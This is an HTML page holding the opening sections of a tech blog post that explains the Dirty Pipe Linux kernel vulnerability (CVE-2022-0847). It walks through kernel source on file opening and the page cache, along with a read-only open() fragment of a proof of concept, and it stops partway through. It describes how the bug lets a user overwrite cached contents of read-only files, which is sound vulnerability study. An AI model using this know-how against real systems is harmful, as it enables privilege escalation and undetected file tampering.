<!doctype html><html lang=en dir=ltr><head><title>Exploration of the Dirty Pipe Vulnerability (CVE-2022-0847) :: lolcads tech blog</title>
<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Intro This blog post reflects our exploration of the Dirty Pipe Vulnerability in the Linux kernel. The bug was discovered by Max Kellermann and described here . If you haven&rsquo;t read the original publication yet, we&rsquo;d suggest that you read it first (maybe also twice ;)). While Kellermann&rsquo;s post is a great resource that contains all the relevant information to understand the bug, it assumes some familiarity with the Linux kernel. To fully understand what&rsquo;s going on we&rsquo;d like to shed some light on specific kernel internals. The aim of this post is to share our knowledge and to provide a resource for other interested individuals. The idea of this post is as follows: We take a small proof-of-concept (PoC) program and divide it into several stages. Each stage issues a system call (or syscall for short), and we will look inside the kernel to understand which actions and state changes occur in response to those calls. For this we use both, the kernel source code (elixir.bootlin.com , version 5.17.9) and a kernel debugging setup (derived from linux-kernel-debugging ). The Dirty Pipe-specific debugging setup and the PoC code is provided in a GitHub repository.
"><meta name=keywords content="Linux,kernel,LPE,pipe,splice,page cache,debugging"><meta name=robots content="noodp"><link rel=manifest href=/manifest.json><meta property="og:url" content="https://lolcads.github.io/posts/2022/06/dirty_pipe_cve_2022_0847/"><meta property="og:site_name" content="lolcads tech blog"><meta property="og:title" content="Exploration of the Dirty Pipe Vulnerability (CVE-2022-0847)"><meta property="og:description" content="Intro This blog post reflects our exploration of the Dirty Pipe Vulnerability in the Linux kernel. The bug was discovered by Max Kellermann and described here . If you haven’t read the original publication yet, we’d suggest that you read it first (maybe also twice ;)). While Kellermann’s post is a great resource that contains all the relevant information to understand the bug, it assumes some familiarity with the Linux kernel. To fully understand what’s going on we’d like to shed some light on specific kernel internals. The aim of this post is to share our knowledge and to provide a resource for other interested individuals. The idea of this post is as follows: We take a small proof-of-concept (PoC) program and divide it into several stages. Each stage issues a system call (or syscall for short), and we will look inside the kernel to understand which actions and state changes occur in response to those calls. For this we use both, the kernel source code (elixir.bootlin.com , version 5.17.9) and a kernel debugging setup (derived from linux-kernel-debugging ). The Dirty Pipe-specific debugging setup and the PoC code is provided in a GitHub repository."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-06-06T19:57:03+02:00"><meta property="article:modified_time" content="2022-06-06T19:57:03+02:00"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Kernel"><meta property="article:tag" content="LPE"><meta property="article:tag" content="Pipe"><meta property="article:tag" content="Splice"><meta property="article:tag" content="Page Cache"><meta name=twitter:card content="summary"><meta name=twitter:title content="Exploration of the Dirty Pipe Vulnerability (CVE-2022-0847)"><meta name=twitter:description content="Intro This blog post reflects our exploration of the Dirty Pipe Vulnerability in the Linux kernel. The bug was discovered by Max Kellermann and described here . If you haven’t read the original publication yet, we’d suggest that you read it first (maybe also twice ;)). While Kellermann’s post is a great resource that contains all the relevant information to understand the bug, it assumes some familiarity with the Linux kernel. To fully understand what’s going on we’d like to shed some light on specific kernel internals. The aim of this post is to share our knowledge and to provide a resource for other interested individuals. The idea of this post is as follows: We take a small proof-of-concept (PoC) program and divide it into several stages. Each stage issues a system call (or syscall for short), and we will look inside the kernel to understand which actions and state changes occur in response to those calls. For this we use both, the kernel source code (elixir.bootlin.com , version 5.17.9) and a kernel debugging setup (derived from linux-kernel-debugging ). The Dirty Pipe-specific debugging setup and the PoC code is provided in a GitHub repository."><link rel=canonical href=https://lolcads.github.io/posts/2022/06/dirty_pipe_cve_2022_0847/><link rel="shortcut icon" href=/favicon.ico><link rel=stylesheet href=/css/index.min.c860e17f20d9f258820c02bf7ab3f57c9595d0bc21dede7eda08ccd63ba3f4cc.css></head><body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800"><header class="flex flex-none justify-center z-10"><div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3"><div class="flex-none ml-2 md:ml-0"><a href=/><img class="h-12 w-12 rounded-full object-cover bg-gray-100" src=/logo.png alt=logo></a></div><div class=flex-1></div><div class=flex-none><nav class="h-full static"><button id=navbar-menu-toggle type=button class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden" aria-controls=navbar-menu aria-expanded=false>
<span class=sr-only>Open main menu</span>
<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 6h16"/><path d="M4 12h16"/><path d="M4 18h16"/></svg></i></button><div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto" id=navbar-menu><ul class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-sm md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5"><li id=post><a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600" href=/posts/ title=Blog>Blog</a></li><li id=about><a class="block px-3 py-3 hover:text-emerald-600" href=/about/ title=About>About</a></li><li id=contact><a class="block px-3 py-3 hover:text-emerald-600" href=/contact/ title=Contact>Contact</a></li></ul></div></nav></div><div class="flex-none mx-1"></div><div class="flex-none md:hidden"><a href=/search/ class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls=navbar-menu aria-expanded=false><span class=sr-only>Search</span>
<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1014 0A7 7 0 103 10"/><path d="M21 21l-6-6"/></svg></i></a></div><div class="darkmode-toggle flex flex-none mr-2 md:mr-0"><label for=darkmode-toggle class="flex items-center px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600" title="Toggle dark mode"><input name=darkmode-toggle id=darkmode-toggle type=checkbox class="sr-only peer" aria-label="Toggle dark mode"><div class="group flex flex-row gap-1 justify-center h-8 px-1 rounded-full bg-white dark:bg-gray-700"><i class="h-6 w-6 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:group-[]:invisible"><svg class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-3 0a3 3 0 106 0 3 3 0 10-6 0"/><path d="M12 5v.01"/><path d="M17 7v.01"/><path d="M19 12v.01"/><path d="M17 17v.01"/><path d="M12 19v.01"/><path d="M7 17v.01"/><path d="M5 12v.01"/><path d="M7 7v.01"/></svg>
</i><i class="h-6 w-6 flex-none rounded-full place-self-center invisible peer-checked:group-[]:visible"><svg class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 3c.132.0.263.0.393.0a7.5 7.5.0 007.92 12.446A9 9 0 1112 2.992z"/><path d="M17 4a2 2 0 002 2 2 2 0 00-2 2 2 2 0 00-2-2 2 2 0 002-2"/><path d="M19 11h2m-1-1v2"/></svg></i></div></label></div></div></header><main class="flex flex-auto justify-center"><div class="w-full max-w-4xl lg:max-w-5xl"><div class="flex flex-col mt-6 mx-2 md:mx-0 rounded-lg overflow-hidden shadow-md bg-white dark:bg-gray-700"><div><a href=/posts/2022/06/dirty_pipe_cve_2022_0847/></a></div><div class="flex flex-col gap-y-3 p-6"><h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100"><a href=/posts/2022/06/dirty_pipe_cve_2022_0847/>Exploration of the Dirty Pipe Vulnerability (CVE-2022-0847)</a></h1><ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300"><li><a href=/tags/linux/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Linux</span></a></li><li><a href=/tags/kernel/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Kernel</span></a></li><li><a href=/tags/lpe/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>LPE</span></a></li><li><a href=/tags/pipe/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Pipe</span></a></li><li><a href=/tags/splice/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Splice</span></a></li><li><a href=/tags/page-cache/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Page Cache</span></a></li><li><a href=/tags/debugging/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Debugging</span></a></li></ul><div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300"><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 7a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V7z"/><path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/><path d="M11 15h1"/><path d="M12 15v3"/></svg>
</i><time datetime=2022-06-06T19:57:03+02:00>2022-06-06</time></div><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6.5 7h11"/><path d="M6 20v-2a6 6 0 1112 0v2a1 1 0 01-1 1H7a1 1 0 01-1-1z"/><path d="M6 4v2a6 6 0 1012 0V4a1 1 0 00-1-1H7A1 1 0 006 4z"/></svg>
</i><span>38 minutes to read</span></div></div><div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300"><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-user"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 7a4 4 0 108 0A4 4 0 008 7"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
</i><span>Valentin Obst and Martin Clauß</span></div></div><section class="prose prose-slate dark:prose-invert w-full max-w-4xl lg:max-w-5xl mt-6"><h2>Table of Contents</h2><aside><nav id=TableOfContents><ul><li><a href=#intro>Intro</a></li><li><a href=#our-goal--disclaimer>Our Goal / Disclaimer</a></li><li><a href=#page-cache>Page Cache</a></li><li><a href=#pipes-general>Pipes (general)</a></li><li><a href=#pipes-initialization>Pipes (initialization)</a><ul><li><a href=#overview>Overview</a></li><li><a href=#code>Code</a></li><li><a href=#debugger>Debugger</a></li></ul></li><li><a href=#pipes-readingwriting>Pipes (reading/writing)</a><ul><li><a href=#writing>Writing</a></li><li><a href=#reading>Reading</a></li><li><a href=#summary>Summary</a></li></ul></li><li><a href=#pipes-splicing>Pipes (splicing)</a><ul><li><a href=#the-splice-system-call-user-land>The <code>splice</code> System Call (user land)</a></li><li><a href=#the-splice-system-call-implementation>The <code>splice</code> System Call (Implementation)</a></li><li><a href=#debugger-1>Debugger</a></li></ul></li><li><a href=#whats-the-actual-problem>What&rsquo;s the Actual Problem?</a><ul><li><a href=#limitations>Limitations</a></li></ul></li><li><a href=#approaches-to-understand-the-bug>Approaches to Understand the Bug</a><ul><li><a href=#top-down-vs-bottom-up-vs-hybrid>Top Down vs. Bottom Up vs. Hybrid</a></li><li><a href=#linux-kernel-source>Linux Kernel Source</a></li></ul></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></aside></section><article class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content"><h2 id=intro>Intro</h2><p>This blog post reflects our exploration of the Dirty Pipe Vulnerability in the Linux kernel. The bug was discovered by Max Kellermann and described <a href=https://dirtypipe.cm4all.com/ target=_blank rel=noopener>here</a>
. If you haven&rsquo;t read the original publication yet, we&rsquo;d suggest that you read it first (maybe also twice ;)). While Kellermann&rsquo;s post is a great resource that contains all the relevant information to understand the bug, it assumes some familiarity with the Linux kernel. To fully understand what&rsquo;s going on we&rsquo;d like to shed some light on specific kernel internals. The aim of this post is to share our knowledge and to provide a resource for other interested individuals. The idea of this post is as follows: We take a small proof-of-concept (PoC) program and divide it into several stages. Each stage issues a system call (or syscall for short), and we will look inside the kernel to understand which actions and state changes occur in response to those calls. For this we use both, the kernel source code (<a href=https://elixir.bootlin.com/linux/v5.17.9/source target=_blank rel=noopener>elixir.bootlin.com</a>
, version 5.17.9) and a kernel debugging setup (derived from <a href=https://github.com/martinclauss/linux-kernel-debugging target=_blank rel=noopener>linux-kernel-debugging</a>
). The Dirty Pipe-specific debugging setup and the PoC code is provided in a <a href=https://github.com/vobst/lkd-cve target=_blank rel=noopener>GitHub</a>
repository.</p><h2 id=our-goal--disclaimer>Our Goal / Disclaimer</h2><p>It&rsquo;s important to talk about the goal of our investigation first:</p><ul><li>Do we want to understand how the Linux kernel works in general? Maybe not right now&mldr;</li><li>Do we want to know what the vulnerability is? Why it occurs? How it can be exploited? Yes!</li></ul><p>It is important to keep in mind, what we want to achieve. The Linux kernel is a <strong>very</strong> complex piece of software. We have to leave some blind spots, but that&rsquo;s <strong>absolutely okay</strong> :)</p><p>Thus, when we show kernel source code we will often hide parts that are not directly relevant for our discussion to improve readability. In general, those parts may very well be security-relevant and we encourage you to follow the links to review the original code. In particular, if you want to find your own vulnerabilities or become a kernel hacker you should spend more time to understand (all) the mechanisms and details! ;)</p><h2 id=page-cache>Page Cache</h2><p>The page cache plays an important role in the Dirty Pipe vulnerability so let&rsquo;s see what it is and how it works first.</p><blockquote><p>The physical memory is volatile and the common case for getting data into the memory is to read it from files. Whenever a file is read, the data is put into the page cache to avoid expensive disk access on the subsequent reads. Similarly, when one writes to a file, the data is placed in the page cache and eventually gets into the backing storage device. The written pages are marked as dirty and when Linux decides to reuse them for other purposes, it makes sure to synchronize the file contents on the device with the updated data. <a href=https://www.kernel.org/doc/html/latest/admin-guide/mm/concepts.html#page-cache target=_blank rel=noopener>source</a></p></blockquote><p>In particular, the above means that if any process on the system (or the kernel itself) requests data from a file that is already cached, the cached data is used instead of accessing the disk. Of course there are ways to influence this behavior by using flags (<code>O_DIRECT | O_SYNC</code>) when opening a file, or by explicitly instructing the kernel to <code>sync</code>hronize dirty pages. You could also discard the cached pages using the <code>sysfs</code> pseudo file system: <code># echo 1 > /proc/sys/vm/drop_caches</code>. However, in most situations the cached data is what is ultimately used by the kernel (and thus also the user processes).</p><p>At this point we can already tease what the Dirty Pipe vulnerability is all about: It will allow us to overwrite the cached data of any file that we are allowed to <strong>open</strong> (read-only access is sufficient), without the page cache actually marking the overwritten page as &lsquo;dirty&rsquo;. Thus, we can trick the system into thinking that the file contents changed (at least for a while) without leaving traces on disk.</p><p>But let&rsquo;s not get ahead of ourselves, the goal is after all to understand <em>why</em> this happens. As we can see, the first thing our PoC does, is opening a file for reading, without any additional flags.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=n>tfd</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=nf>pause_for_inspection</span><span class=p>(</span><span class=s>&#34;About to open() file&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>tfd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;./target_file&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span></code></pre></div><p><a href=https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L61 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>The kernel function handling our <code>open</code> user space call is <code>do_sys_openat2()</code>. It attempts to get the file in the desired mode, and if everything succeeds it installs a new file descriptor that is backed by the file and returns it (the file descriptor is just an <code>int</code>eger).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=kt>long</span>
</span></span><span class=line><span class=cl><span class=nf>do_sys_openat2</span><span class=p>(</span><span class=kt>int</span> <span class=n>dfd</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=n>__user</span> <span class=o>*</span><span class=n>filename</span><span class=p>,</span> <span class=k>struct</span> <span class=n>open_how</span> <span class=o>*</span><span class=n>how</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>open_flags</span> <span class=n>op</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>build_open_flags</span><span class=p>(</span><span class=n>how</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>op</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>filename</span> <span class=o>*</span><span class=n>tmp</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=n>tmp</span> <span class=o>=</span> <span class=nf>getname</span><span class=p>(</span><span class=n>filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=n>fd</span> <span class=o>=</span> <span class=nf>get_unused_fd_flags</span><span class=p>(</span><span class=n>how</span><span class=o>-&gt;</span><span class=n>flags</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>file</span> <span class=o>*</span><span class=n>f</span> <span class=o>=</span> <span class=nf>do_filp_open</span><span class=p>(</span><span class=n>dfd</span><span class=p>,</span> <span class=n>tmp</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>op</span><span class=p>);</span> <span class=c1>// lolcads: maybe follow ...
</span></span></span><span class=line><span class=cl><span class=c1></span>                                                  <span class=c1>// but don&#39;t get lost ;)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>IS_ERR</span><span class=p>(</span><span class=n>f</span><span class=p>))</span> <span class=p>{</span> <span class=c1>// lolcads: e.g. permission checks failed, doesn&#39;t exist...
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nf>put_unused_fd</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>fd</span> <span class=o>=</span> <span class=nf>PTR_ERR</span><span class=p>(</span><span class=n>f</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fsnotify_open</span><span class=p>(</span><span class=n>f</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>fd_install</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>f</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>putname</span><span class=p>(</span><span class=n>tmp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>fd</span><span class=p>;</span> <span class=c1>// lolcads: breakpoint 1
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/open.c#L1198 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>Following the call to <code>do_filp_open()</code> bears the danger of getting lost in the jungle of the (virtual) file system. To avoid going down that rabbit hole we place our first breakpoint on the <code>return</code> statement. This gives us the opportunity to find the <code>struct file</code> that is backing the file descriptor our PoC process receives.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>file</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>path</span>                  <span class=n>f_path</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>inode</span>                 <span class=o>*</span><span class=n>f_inode</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=k>struct</span> <span class=n>file_operations</span> <span class=o>*</span><span class=n>f_op</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>address_space</span>         <span class=o>*</span><span class=n>f_mapping</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/fs.h#L956 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>Importantly, the <code>f_mapping</code> field leads us to the <code>struct address_space</code> that represents the page cache object associated to the file. The <code>a_ops</code> field points to implementations of typical operations one might want to perform on a page cache object e.g., reading ahead, marking pages as dirty or writing back dirty pages, and so on.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>address_space</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>inode</span>        <span class=o>*</span><span class=n>host</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>xarray</span>       <span class=n>i_pages</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span>       <span class=n>nrpages</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>pgoff_t</span>             <span class=n>writeback_index</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=k>struct</span> <span class=n>address_space_operations</span> <span class=o>*</span><span class=n>a_ops</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span>       <span class=n>flags</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/fs.h#L450 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>The actual cached data lies on one or more pages somewhere in physical memory. Each and every page of physical memory is described by a <code>struct page</code>. An <a href=https://lwn.net/Articles/745073/ target=_blank rel=noopener>extendable array</a>
(<code>struct xarray</code>) containing pointers to those page structs can be found in the <code>i_pages</code> field of the <code>struct address_space</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>page</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>flags</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* Page cache and anonymous pages */</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>address_space</span> <span class=o>*</span><span class=n>mapping</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>pgoff_t</span> <span class=n>index</span><span class=p>;</span>        <span class=cm>/* Our offset within mapping. */</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>     * If the page can be mapped to userspace, encodes the number
</span></span></span><span class=line><span class=cl><span class=cm>     * of times this page is referenced by a page table.
</span></span></span><span class=line><span class=cl><span class=cm>     */</span>
</span></span><span class=line><span class=cl>    <span class=kt>atomic_t</span> <span class=n>_mapcount</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>     * If the page is neither PageSlab nor mappable to userspace,
</span></span></span><span class=line><span class=cl><span class=cm>     * the value stored here may help determine what this page
</span></span></span><span class=line><span class=cl><span class=cm>     * is used for.  See page-flags.h for a list of page types
</span></span></span><span class=line><span class=cl><span class=cm>     * which are currently stored here.
</span></span></span><span class=line><span class=cl><span class=cm>     */</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>page_type</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* Usage count. *DO NOT USE DIRECTLY*. See page_ref.h */</span>
</span></span><span class=line><span class=cl>    <span class=kt>atomic_t</span> <span class=n>_refcount</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>     * On machines where all RAM is mapped into kernel address space,
</span></span></span><span class=line><span class=cl><span class=cm>     * we can simply calculate the virtual address. On machines with
</span></span></span><span class=line><span class=cl><span class=cm>     * highmem some memory is mapped into kernel virtual memory
</span></span></span><span class=line><span class=cl><span class=cm>     * dynamically, so we need a place to store that address.
</span></span></span><span class=line><span class=cl><span class=cm>     * Note that this field could be 16 bits on x86 ... ;)
</span></span></span><span class=line><span class=cl><span class=cm>     *
</span></span></span><span class=line><span class=cl><span class=cm>     * Architectures with slow multiplication can define
</span></span></span><span class=line><span class=cl><span class=cm>     * WANT_PAGE_VIRTUAL in asm/page.h
</span></span></span><span class=line><span class=cl><span class=cm>     */</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=o>*</span><span class=n>virtual</span><span class=p>;</span>    <span class=cm>/* Kernel virtual address (NULL if
</span></span></span><span class=line><span class=cl><span class=cm>                       not kmapped, ie. highmem) */</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/mm_types.h#L72 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>The last comment gives a hint at how to find the actual page of physical memory described by this struct within the kernel&rsquo;s virtual address space. (The kernel maps all of physical memory into its virtual address space so we know its <em>somewhere</em>. Refer to the <a href=https://elixir.bootlin.com/linux/v5.17.9/source/Documentation/x86/x86_64/mm.rst target=_blank rel=noopener>documentation</a>
for more details.)</p><pre tabindex=0><code>========================================================================================================================
      Start addr    |   Offset   |     End addr     |  Size   | VM area description 
========================================================================================================================
...
   ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)
...
